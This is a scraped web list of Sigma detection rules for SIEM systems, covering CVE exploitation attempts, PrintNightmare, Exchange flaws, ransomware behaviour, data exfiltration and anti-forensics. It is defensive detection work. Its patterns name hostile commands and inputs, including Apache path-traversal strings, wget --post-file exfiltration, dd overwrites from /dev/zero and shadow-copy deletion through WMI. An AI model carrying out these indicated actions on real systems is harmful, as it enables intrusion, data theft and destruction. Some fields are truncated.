<li><a href="#">title:CVE-2020-5902 F5 BIG-IP Exploitation Attempt id: 44b53b1c-e60f-4a7b-948e-3435a7918478 status: test description: Detects the exploitation attempt of the vulnerability found in F5 BIG-IP and described in CVE-2020-5902 author: Florian Roth references: - - - - date: 2020/07/05 modified: 2021/11/27 logsource: category: webserver detection: selection_base: c-uri|contains: - '/tmui/' - '/hsqldb' selection_traversal: c-uri|contains: - '..;/' - '.jsp/..' condition: selection_base and selection_traversal fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:CVE-2021-1675 Print Spooler Exploitation Filename Pattern id: 2131cfb3-8c12-45e8-8fa0-31f5924e9f07 description: Detects the default filename used in PoC code against print spooler vulnerability CVE-2021-1675 author: Florian Roth status: experimental level: critical references: - - - date: 2021/06/29 modified: 2021/12/01 tags: - attack.execution - attack.privilege_escalation - attack.resource_development - attack.t1587 - cve.2021.1675 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: 'C:\Windows\System32\spool\drivers\x64\3\old\1\123' condition: selection fields: - ComputerName - TargetFilename falsepositives: - Unknown 
<li><a href="#">title:CVE-2021-1675 Print Spooler Exploitation id: f34d942d-c8c4-4f1f-b196-22471aecf10a description: Detects driver load events print service operational log that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 author: Florian Roth status: experimental references: - date: 2021/07/01 tags: - attack.execution - attack.t1569 - cve.2021.1675 logsource: product: windows service: printservice-operational detection: selection: EventID: '316' keywords: - 'UNIDRV.DLL, kernelbase.dll, ' - ' 123 ' - ' 1234 ' - 'mimispool' condition: selection and keywords fields: - DriverAdded falsepositives: - Unknown level: critical 
<li><a href="#">title:CVE-2021-1675 Print Spooler Exploitation IPC Access id: 8fe1c584-ee61-444b-be21-e9054b229694 description: Detects remote printer driver load from Detailed File Share in Security logs that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 and CVE-2021-34527 author: INIT_6 status: experimental level: critical references: - date: 2021/07/02 tags: - attack.execution - attack.t1569 - cve.2021.1675 - cve.2021.34527 logsource: product: windows service: security detection: selection: EventID: '5145' ShareName: '\\\*\IPC$' RelativeTargetName: 'spoolss' AccessMask: '0x3' ObjectType: 'File' condition: selection falsepositives: - Unknown 
<li><a href="#">title:CVE-2021-21972 VSphere Exploitation id: 179ed852-0f9b-4009-93a7-68475910fd86 status: experimental description: Detects the exploitation of VSphere Remote Code Execution vulnerability as described in CVE-2021-21972 author: Bhabesh Raj date: 2021/02/24 modified: 2021/08/09 references: - - - logsource: category: webserver detection: selection: cs-method: 'POST' c-uri: '/ui/vropspluginui/rest/services/uploadova' condition: selection fields: - c-ip - c-dns falsepositives: - OVA uploads to your VSphere appliance level: high tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:CVE-2021-21978 Exploitation Attempt id: 77586a7f-7ea4-4c41-b19c-820140b84ca9 status: test description: Detects the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978 author: Bhabesh Raj references: - - date: 2020/03/10 modified: 2021/11/27 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains|all: - 'logupload' - 'logMetaData' - 'wsgi_log_upload.py' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - cve.2021.21978 
<li><a href="#">title:CVE-2021-26857 Exchange Exploitation id: cd479ccc-d8f0-4c66-ba7d-e06286f3f887 description: Detects possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server's Unified Messaging service author: Bhabesh Raj status: stable level: high references: - date: 2021/03/03 tags: - attack.t1203 - attack.execution - cve.2021.26857 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: 'UMWorkerProcess.exe' filter: Image|endswith: - 'wermgr.exe' - 'WerFault.exe' condition: selection and not filter falsepositives: - Unknown 
<li><a href="#">title:CVE-2021-26858 Exchange Exploitation id: b06335b3-55ac-4b41-937e-16b7f5d57dfd description: Detects possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for | creation of non-standard files on disk by Exchange Serverâ€™s Unified Messaging service | which could indicate dropping web shells or other malicious content author: Bhabesh Raj status: experimental references: - date: 2021/03/03 tags: - attack.t1203 - attack.execution - cve.2021.26858 logsource: category: file_event product: windows detection: selection: Image|endswith: 'UMWorkerProcess.exe' filter: TargetFilename|endswith: - 'CacheCleanup.bin' - '.txt' - '.LOG' - '.cfg' - 'cleanup.bin' condition: selection and not filter fields: - ComputerName - TargetFilename falsepositives: - Unknown level: high 
<li><a href="#">title:CVE-2021-3156 Exploitation Attempt id: 5ee37487-4eb8-4ac2-9be1-d7d14cdc559f status: experimental description: Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow. author: Bhabesh Raj date: 2021/02/01 modified: 2021/09/14 references: - tags: - attack.privilege_escalation - attack.t1068 - cve.2021.3156 logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0: '/usr/bin/sudoedit' cmd1: a1: '-s' cmd2: a2: '-s' cmd3: a3: '-s' cmd4: a4: '-s' cmd5: a1: '\' cmd6: a2: '\' cmd7: a3: '\' cmd8: a4: '\' condition: selection and (cmd1 or cmd2 or cmd3 or cmd4) and (cmd5 or cmd6 or cmd7 or cmd8) falsepositives: - Unknown level: high 
<li><a href="#">title:CVE-2021-3156 Exploitation Attempt id: b9748c98-9ea7-4fdb-80b6-29bed6ba71d2 related: - id: 5ee37487-4eb8-4ac2-9be1-d7d14cdc559f type: derived status: experimental description: Detects exploitation attempt of vulnerability described in CVE-2021-3156. | Alternative approach might be to look for flooding of auditd logs due to bruteforcing | required to trigger the heap-based buffer overflow. author: Bhabesh Raj date: 2021/02/01 modified: 2021/09/14 references: - tags: - attack.privilege_escalation - attack.t1068 - cve.2021.3156 logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' exe: '/usr/bin/sudoedit' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum id: ad7085ac-92e4-4b76-8ce2-276d2c0e68ef status: experimental description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum author: Sittikorn S date: 2021/07/16 modified: 2021/09/09 references: - - tags: - attack.credential_access - attack.t1566 - attack.t1203 - cve.2021.33771 - cve.2021.31979 # - threat_group.Sourgum logsource: product: windows category: file_event detection: selection: TargetFilename|contains: - 'C:\Windows\system32\physmem.sys' - 'C:\Windows\System32\IME\IMEJP\imjpueact.dll' - 'C:\Windows\system32\ime\IMETC\IMTCPROT.DLL' - 'C:\Windows\system32\ime\SHARED\imecpmeid.dll' - 'C:\Windows\system32\config\spp\ServiceState\Recovery\pac.dat' - 'C:\Windows\system32\config\cy-GB\Setup\SKB\InputMethod\TupTask.dat' - 'C:\Windows\system32\config\config\startwus.dat' - 'C:\Windows\system32\ime\SHARED\WimBootConfigurations.ini' - 'C:\Windows\system32\ime\IMEJP\WimBootConfigurations.ini' - 'C:\Windows\system32\ime\IMETC\WimBootConfigurations.ini' condition: selection falsepositives: - Unlikely level: critical 
<li><a href="#">title:CVE-2021-31979 CVE-2021-33771 Exploits id: 32b5db62-cb5f-4266-9639-0fa48376ac00 status: experimental description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum author: Sittikorn S, frack113 date: 2021/07/16 modified: 2022/06/29 references: - - tags: - attack.credential_access - attack.t1566 - attack.t1203 - cve.2021.33771 - cve.2021.31979 # - threat_group.Sourgum logsource: product: windows category: registry_event detection: selection: TargetObject|endswith: - CLSID\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\InprocServer32\(Default) - CLSID\{7C857801-7381-11CF-884D-00AA004B2E24}\InProcServer32\(Default) filter: Details|endswith: - system32\wbem\wmiutils.dll - system32\wbem\wbemsvc.dll condition: selection and not filter falsepositives: - Unlikely level: critical 
<li><a href="#">title:CVE-2021-33766 Exchange ProxyToken Exploitation id: 56973b50-3382-4b56-bdf5-f51a3183797a status: experimental description: Detects the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766 author: Florian Roth, Max Altgelt, Christian Burkard date: 2021/08/30 references: - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-method: 'POST' c-uri|contains|all: - '/ecp/' - '/RulesEditor/InboxRules.svc/NewObject' sc-status: 500 selection2: c-uri|contains|all: - 'SecurityToken=' - '/ecp/' sc-status: 500 condition: selection1 or selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical 
<li><a href="#">title:CVE-2021-4034 Exploitation Attempt id: 40a016ab-4f48-4eee-adde-bbf612695c53 description: Detects exploitation attempt of vulnerability described in CVE-2021-4034. author: 'Pawel Mazur' status: experimental date: 2022/01/27 references: - - - logsource: product: linux service: auditd detection: proc
<li><a href="#">title:CVE-2021-40444 Process Pattern id: 894397c6-da03-425c-a589-3d09e7d1f750 description: Detects a suspicious process pattern found in CVE-2021-40444 exploitation status: test references: - - - author: '@neonprimetime, Florian Roth' date: 2021/09/08 modified: 2022/03/03 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\control.exe' ParentImage|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' filter: CommandLine|endswith: - '\control.exe input.dll' - '\control.exe" input.dll' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059 
<li><a href="#">title:CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit id: fcbb4a77-f368-4945-b046-4499a1da69d1 status: experimental description: Detects an authentication bypass vulnerability affecting the REST API URLs in ADSelfService Plus (CVE-2021-40539). references: - - - author: Sittikorn S, Nuttakorn Tungpoonsup date: 2021/09/10 modified: 2021/09/17 tags: - attack.initial_access - attack.t1190 - attack.persistence - attack.t1505.003 logsource: category: webserver definition: 'Must be collect log from \ManageEngine\ADSelfService Plus\logs' detection: selection: c-uri|contains: - '/help/admin-guide/Reports/ReportGenerate.jsp' - '/RestAPI/LogonCustomization' - '/RestAPI/Connection' condition: selection fields: - c-ip - c-uri falsepositives: - Unknown level: critical 
<li><a href="#">title:CVE-2021-41773 Exploitation Attempt id: 3007fec6-e761-4319-91af-e32e20ac43f5 status: experimental description: Detects exploitation of flaw in path normalization in Apache HTTP server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. author: daffainfo, Florian Roth date: 2021/10/05 modified: 2021/10/06 references: - - - - - - logsource: category: webserver detection: selection: c-uri|contains: - '/cgi-bin/.%2e/' - '/icons/.%2e/' - '/cgi-bin/.%%32%65/' - '/icons/.%%32%65/' - '/cgi-bin/.%%%25%33' - '/icons/.%%%25%33' selection_success: sc-status: - 200 - 301 condition: selection and selection_success falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: high 
<li><a href="#">title:CVE-2021-44077 POC Default Dropped File id: 7b501acf-fa98-4272-aa39-194f82edc8a3 status: experimental description: Detects the creation of "msiexec.exe" in the "bin" directory of the ManageEngine SupportCenter Plus (Related to CVE-2021-44077) and public POC available (See references section) author: Nasreddine Bencherchali references: - - date: 2022/06/06 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '\ManageEngine\SupportCenterPlus\bin\msiexec.exe' condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - cve.2021.44077 
<li><a href="#">title:CVE-2022-24527 Microsoft Connected Cache LPE id: e0a41412-c69a-446f-8e6e-0e6d7483dad7 description: Detects files created during the local privilege exploitation of CVE-2022-24527 Microsoft Connected Cache author: Florian Roth status: experimental references: - date: 2022/04/13 tags: - attack.privilege_escalation - attack.t1059.001 - cve.2022.24527 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: 'WindowsPowerShell\Modules\webAdministration\webAdministration.psm1' filter: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:DarkSide Ransomware Pattern id: 965fff6c-1d7e-4e25-91fd-cdccd75f7d2c author: Florian Roth date: 2021/05/14 description: Detects DarkSide Ransomware and helpers status: test references: - - - logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - '=[char][byte](''0x''+' - ' -work worker0 -path ' selection2: ParentCommandLine|contains: 'DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' Image|contains: '\AppData\Local\Temp\' condition: 1 of selection* falsepositives: - Unknown - UAC bypass method used by other malware level: critical tags: - attack.execution - attack.t1204 
<li><a href="#">title:Data Compressed - PowerShell id: 6dc5d284-69ea-42cf-9311-fb1c3932a69a status: experimental description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, oscd.community date: 2019/10/21 modified: 2021/10/16 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - '-Recurse' - '|' - 'Compress-Archive' condition: selection falsepositives: - Highly likely if archive operations are done via PowerShell. level: low tags: - attack.exfiltration - attack.t1560 
<li><a href="#">title:Data Compressed - rar.exe id: 6f3e2987-db24-4c78-a860-b4f4095a7095 status: test description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, E.M. Anhaus, oscd.community references: - - date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rar.exe' CommandLine|contains: ' a ' condition: selection fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Highly likely if rar is a default archiver in the monitored environment. level: low tags: - attack.collection - attack.t1560.001 
<li><a href="#">title:Data Compressed id: a3b5e3e9-1b49-4119-8b8e-0344a01f21ee status: test description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection1: type: 'execve' a0: 'zip' selection2: type: 'execve' a0: 'gzip' a1: '-f' selection3: type: 'execve' a0: 'tar' a1|contains: '-c' condition: 1 of selection* falsepositives: - Legitimate use of archiving tools by legitimate user. level: low tags: - attack.exfiltration - attack.t1560.001 
<li><a href="#">title:Data Exfiltration to Unsanctioned Apps id: 2b669496-d215-47d8-bd9a-f4a45bf07cda status: experimental description: Detects when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization. author: Austin Songer @austinsonger date: 2021/08/23 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Data exfiltration to unsanctioned apps' status: success condition: selection falsepositives: - Unknown level: medium tags: - attack.exfiltration - attack.t1537 
<li><a href="#">title:Data Exfiltration with Wget id: cb39d16b-b3b6-4a7a-8222-1cf24b686ffc description: Detects attempts to post the file with the usage of wget utility. The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow. author: 'Pawel Mazur' status: experimental date: 2021/11/18 references: - - - logsource: product: linux service: auditd detection: selection: type: EXECVE a0: wget a1|startswith: '--post-file=' condition: selection tags: - attack.exfiltration - attack.t1048.003 falsepositives: - Legitimate usage of wget utility to post a file level: medium 
<li><a href="#">title:DCERPC SMB Spoolss Named Pipe id: 214e8f95-100a-4e04-bb31-ef6cba8ce07e status: test description: Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled. author: OTR (Open Threat Research) references: - - - date: 2018/11/28 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName: \\\*\IPC$ RelativeTargetName: spoolss condition: selection falsepositives: - 'Domain Controllers acting as printer servers too? :)' level: medium tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:DD File Overwrite id: 2953194b-e33c-4859-b9e8-05948c167447 status: experimental description: Detects potential overwriting and deletion of a file using DD. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1485 references: - logsource: product: linux category: process_creation detection: selection1: Image: - '/bin/dd' - '/usr/bin/dd' selection2: CommandLine|contains: 'of=' selection3: CommandLine|contains: - 'if=/dev/zero' - 'if=/dev/null' condition: selection1 and selection2 and selection3 falsepositives: - Any user deleting files that way. level: low 
<li><a href="#">title:Decode Base64 Encoded Text id: 719c22d7-c11a-4f2c-93a6-2cfdd5412f68 status: test description: Detects usage of base64 utility to decode arbitrary base64-encoded text author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image: '/usr/bin/base64' CommandLine|contains: '-d' condition: selection falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:Decode Base64 Encoded Text id: e2072cab-8c9a-459b-b63c-40ae79e27031 status: test description: Detects usage of base64 utility to decode arbitrary base64-encoded text author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection: Image|endswith: '/base64' CommandLine|contains: '-d' condition: selection falsepositives: - Legitimate activities level: low tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:Default Cobalt Strike Certificate id: 7100f7e3-92ce-4584-b7b7-01b40d3d4118 description: Detects the presence of default Cobalt Strike certificate in the HTTPS traffic status: experimental author: Bhabesh Raj date: 2021/06/23 modified: 2021/08/24 references: - tags: - attack.command_and_control - attack.s0154 logsource: product: zeek service: x509 detection: selection: certificate.serial: 8BB00EE condition: selection fields: - san.dns - certificate.subject - certificate.issuer falsepositives: - Unknown level: high 
<li><a href="#">title:Default Credentials Usage id: 1a395cbc-a84a-463a-9086-ed8a70e573c7 status: stable description: Before deploying any new asset, change all default passwords to have values consistent with administrative level accounts. Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management. author: Alexandr Yampolskyi, SOC Prime references: - - - - date: 2019/03/26 logsource: product: qualys detection: selection: host.scan.vuln: - 10693 - 11507 - 11633 - 11804 - 11821 - 11847 - 11867 - 11931 - 11935 - 11950 - 12541 - 12558 - 12559 - 12560 - 12562 - 12563 - 12565 - 12587 - 12590 - 12599 - 12702 - 12705 - 12706 - 12907 - 12928 - 12929 - 13053 - 13178 - 13200 - 13218 - 13241 - 13253 - 13274 - 13296 - 13301 - 13327 - 13373 - 13374 - 13409 - 13530 - 13532 - 20065 - 20073 - 20081 - 27202 - 27358 - 38702 - 38719 - 42045 - 42417 - 43029 - 43220 - 43221 - 43222 - 43223 - 43225 - 43246 - 43431 - 43484 - 86857 - 87098 - 87106 condition: selection falsepositives: - Unknown level: medium # tags: # - CSC4 # - CSC4.2 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 
<li><a href="#">title:Default PowerSploit and Empire Schtasks Persistence id: 56c217c3-2de2-479b-990f-5c109ba8458f status: test description: Detects the creation of a schtask via PowerSploit or Empire Default Configuration. author: Markus Neis, @Karneades references: - - - date: 2018/03/06 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection1: ParentImage|endswith: '\powershell.exe' Image|endswith: '\schtasks.exe' CommandLine|contains|all: - '/Create' - '/SC' selection2: CommandLine|contains: - 'ONLOGON' - 'DAILY' - 'ONIDLE' - 'Updater' CommandLine|contains|all: - '/TN' - 'Updater' - '/TR' - 'powershell' condition: selection1 and selection2 falsepositives: - False positives are possible, depends on organisation and processes level: high tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.s0111 - attack.g0022 - attack.g0060 - car.2013-08-001 - attack.t1053.005 - attack.t1059.001 
<li><a href="#">title:Defrag Deactivation id: 958d81aa-8566-4cea-a565-59ccd4df27b0 description: Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group status: experimental author: Florian Roth, Bartlomiej Czyz (@bczyz1) date: 2019/03/04 modified: 2021/09/19 references: - tags: - attack.persistence - attack.t1053.005 - attack.s0111 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\schtasks.exe' CommandLine|contains: - '/delete' - '/change' CommandLine|contains|all: - '/TN' - '\Microsoft\Windows\Defrag\ScheduledDefrag' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Defrag Deactivation id: c5a178bf-9cfb-4340-b584-e4df39b6a3e7 related: - id: 958d81aa-8566-4cea-a565-59ccd4df27b0 type: derived description: Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group status: experimental author: Florian Roth, Bartlomiej Czyz (@bczyz1) date: 2019/03/04 modified: 2021/09/19 references: - tags: - attack.persistence - attack.t1053 - attack.s0111 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Audit Other Object Access Events > Success' detection: selection: EventID: 4701 TaskName: '\Microsoft\Windows\Defrag\ScheduledDefrag' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Delete Log from Application id: b1decb61-ed83-4339-8e95-53ea51901720 status: experimental description: Deletion of log files is a known anti-forensic technique author: frack113 references: - date: 2022/01/16 logsource: product: windows category: file_delete detection: selection_teamviewer: TargetFilename|endswith: '.log' TargetFilename|contains: '\TeamViewer_' filter: Image: C:\Windows\system32\svchost.exe condition: selection_teamviewer and not filter falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:Delete Rule in Windows Firewall with Advanced Security id: c187c075-bb3e-4c62-b4fa-beae0ffc211f status: experimental description: A rule has been deleted in the Windows Firewall exception list. author: frack113 date: 2022/02/19 modified: 2022/02/22 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: - 2006 - 2033 #All rules filter: - ModifyingApplication: 'C:\Windows\System32\svchost.exe' - ModifyingApplication|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' condition: selection and not filter level: medium 
<li><a href="#">title:Delete Volume Shadow Copies Via WMI With PowerShell id: 87df9ee1-5416-453a-8a08-e8d4a51e9ce1 description: Shadow Copies deletion using operating systems utilities via PowerShell references: - - - tags: - attack.impact - attack.t1490 status: stable author: frack113 date: 2021/06/03 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection_obj: HostApplication|contains|all: - 'Get-WmiObject' - ' Win32_Shadowcopy' selection_del: HostApplication|contains: - 'Delete()' - 'Remove-WmiObject' condition: selection_obj and selection_del fields: - HostApplication falsepositives: - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason level: high 
<li><a href="#">title:Delete Volume Shadow Copies via WMI with PowerShell id: e17121b4-ef2a-4418-8a59-12fb1631fa9e status: test author: frack113 date: 2021/12/26 description: Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Get-WmiObject' - 'Win32_Shadowcopy' - '.Delete()' condition: selection falsepositives: - Unknown level: high tags: - attack.impact - attack.t1490 
<li><a href="#">title:Deletes Backup Files id: 06125661-3814-4e03-bfa2-1e4411c60ac3 status: experimental description: Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. author: frack113 references: - date: 2022/01/02 modified: 2022/06/02 logsource: product: windows category: file_delete detection: selection: Image|endswith: '\cmd.exe' TargetFilename|endswith: - '.VHD' - '.bac' - '.bak' - '.wbcat' - '.bkf' - '.set' - '.win' - '.dsk' condition: selection falsepositives: - Legitime usage level: medium tags: - attack.impact - attack.t1490 
<li><a href="#">title:Denied Access To Remote Desktop id: 8e5c03fa-b7f0-11ea-b242-07e0576828d9 status: test description: This event is generated when an authenticated user who is not allowed to log on remotely attempts to connect to this computer through Remote Desktop. Often, this event can be generated by attackers when searching for available windows servers in the network. author: Pushkarev Dmitry references: - date: 2020/06/27 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4825 condition: selection fields: - EventCode - AccountName - ClientAddress falsepositives: - Valid user was not added to RDP group level: medium tags: - attack.lateral_movement - attack.t1021.001 
<li><a href="#">title:Detect Virtualbox Driver Installation OR Starting Of VMs id: bab049ca-7471-4828-9024-38279a4c04da status: experimental description: Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM. references: - - - author: Janantha Marasinghe date: 2020/09/26 modified: 2021/06/27 tags: - attack.defense_evasion - attack.t1564.006 - attack.t1564 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: - 'VBoxRT.dll,RTR3Init' - 'VBoxC.dll' - 'VBoxDrv.sys' selection_2: CommandLine|contains: - 'startvm' - 'controlvm' condition: selection_1 or selection_2 fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - This may have false positives on hosts where Virtualbox is legitimately being used for operations level: low 
<li><a href="#">title:Detected Windows Software Discovery id: 2650dd1a-eb2a-412d-ac36-83f06c4f2282 description: Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable. status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/16 modified: 2021/11/12 references: - - #AVQuery.cna tags: - attack.discovery - attack.t1518 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection: ScriptBlockText|contains|all: # Example: Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize - 'get-itemProperty' - '\software\' - 'select-object' - 'format-table' condition: selection level: medium falsepositives: - Legitimate administration activities 
<li><a href="#">title:Detected Windows Software Discovery id: e13f668e-7f95-443d-98d2-1816a7648a7b related: - id: 2650dd1a-eb2a-412d-ac36-83f06c4f2282 type: derived description: Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable. status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/16 modified: 2021/09/21 references: - - #AVQuery.cna tags: - attack.discovery - attack.t1518 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\reg.exe' # Example: reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion CommandLine|contains|all: - 'query' - '\software\' - '/v' - 'svcversion' condition: selection level: medium falsepositives: - Legitimate administration activities 
<li><a href="#">title:Detecting Fake Instances Of Hxtsr.exe id: 4e762605-34a8-406d-b72e-c1a089313320 status: experimental description: HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.HxTsr.exe is part of Outlook apps, because it resides in a hidden "WindowsApps" subfolder of "C:\Program Files". Its path includes a version number, e.g., "C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_17.7466.41167.0_x64__8wekyb3d8bbwe\HxTsr.exe". Any instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe author: Sreeman date: 2020/04/17 modified: 2022/03/06 logsource: product: windows category: process_creation detection: selection: Image: hxtsr.exe filter: CurrentDirectory|startswith: 'C:\program files\windowsapps\microsoft.windowscommunicationsapps_' CurrentDirectory|endswith: '\hxtsr.exe' condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1036 
<li><a href="#">title:Detection of PowerShell Execution via DLL id: 6812a10b-60ea-420c-832f-dfcc33b646ba status: test description: Detects PowerShell Strings applied to rundll as seen in PowerShdll.dll author: Markus Neis references: - date: 2018/08/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\rundll32.exe' selection2: Description|contains: 'Windows-Hostprozess (Rundll32)' selection3: CommandLine|contains: - 'Default.GetString' - 'FromBase64String' condition: (selection1 or selection2) and selection3 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 
